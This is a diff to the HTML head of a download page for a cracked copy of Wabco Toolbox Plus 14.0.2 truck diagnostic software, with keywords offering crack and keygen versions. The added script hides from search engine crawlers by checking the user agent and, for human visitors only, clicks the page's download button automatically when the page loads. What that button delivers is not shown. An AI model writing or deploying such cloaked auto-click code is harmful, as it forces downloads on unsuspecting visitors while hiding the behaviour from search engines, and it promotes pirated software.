@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wabco Toolbox Plus 14.0.2 12.2023</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Wabco Toolbox Plus 14.0.2 (12.2023), a diagnostic software in English and German for Windows, supporting ABS, HPB, ECAS, and collision safety systems.">
     <meta name="keywords" content="Wabco Toolbox Plus 14.0.2, Wabco Toolbox 14.0, Wabco Toolbox Plus 14.0.2 12.2023, Wabco Toolbox Plus 14.0.2 download, Wabco Toolbox Plus 14.0.2 free download, Wabco Toolbox Plus 14.0.2 keygen, Wabco Toolbox Plus 14.0.2 crack, ECAS CAN2 v3.00, ABS Diagnostics Software, Hydraulic Power Brake Diagnostics, Pneumatic ABS Tool, Trailer RSS Plus Diagnostic Tool, Electronic Leveling Valves, ECAS for Buses Diagnostics, OnGuard TM Collision Safety Systems, OnLaneALERT SRR Diagnostics, OnGuardMAX Diagnostics, AMP for mBSP Replacement P/Ns, Vehicle System Fault Display, System Integrity Verification Tool, Wabco diagnostic software, Wabco diagnostic software download, Wabco diagnostic software free download, Wabco diagnostic software keygen, Wabco diagnostic software crack, Wabco Toolbox Plus 14.0.2 diagnostic software, Wabco Toolbox Plus 14.0.2 diagnostic software download, Wabco Toolbox Plus 14.0.2 diagnostic software free download, Wabco Toolbox Plus 14.0.2 diagnostic software keygen, Wabco Toolbox Plus 14.0.2 diagnostic software crack, Wabco Toolbox Plus 14.0.2 in English, Wabco Toolbox Plus 14.0.2 auf Deutsch, Вабко Toolbox Plus 14.0.2, Вабко диагностическое программное обеспечение, Вабко Toolbox Plus 14.0.2 скачать, Вабко Toolbox Plus 14.0.2 скачать бесплатно, Вабко Toolbox Plus 14.0.2 скачать бесплатно 2023, Wabco diagnostic software 2023, Wabco Toolbox Plus 12.2023, programa de diagnóstico Wabco, logiciel de diagnostic Wabco">
     <style>
